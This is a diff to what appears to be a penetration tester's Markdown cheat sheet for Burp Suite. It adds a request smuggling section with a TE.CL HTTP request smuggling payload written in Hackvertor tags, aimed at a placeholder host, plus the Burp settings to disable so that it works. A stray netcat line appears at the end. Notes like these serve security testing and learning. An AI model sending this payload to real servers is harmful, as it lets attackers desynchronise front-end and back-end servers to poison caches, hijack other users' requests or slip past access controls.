@@ -9,6 +9,7 @@
    + [XSS](#xss) 
    + [XXE](#xxe)
    + [ESI](#esi)
+   + [Request Smuggling](#request-smuggling)
 - [dev/null](#devnull)
 
 ## Burp Suite Professional
@@ -77,6 +78,24 @@ you have ESI injection
  - https://t.co/XRxIalWcng?amp=1 
  - https://t.co/vzRIo3RuaR?amp=1
  - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
+ 
+ ### Request Smuggling  
+ TE.CL + Hackvertor *(disable “Update Content-Length” in Repeater && “Auto Update Content Length” in Hackvertor Settings)*  
+ ```
+ POST / HTTP/1.1
+Host: abc.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 3
+
+<@chunked_dec2hex_4><@get_var_3 /><@/chunked_dec2hex_4>
+<@set_var_1><@length_2>GPOST / HTTP/1.1
+Host: abc.com
+Content-Length: 15
+
+x=1<@/length_2><@/set_var_1>
+0
+```
 
 ## dev/null
 nc permament 'web-server'
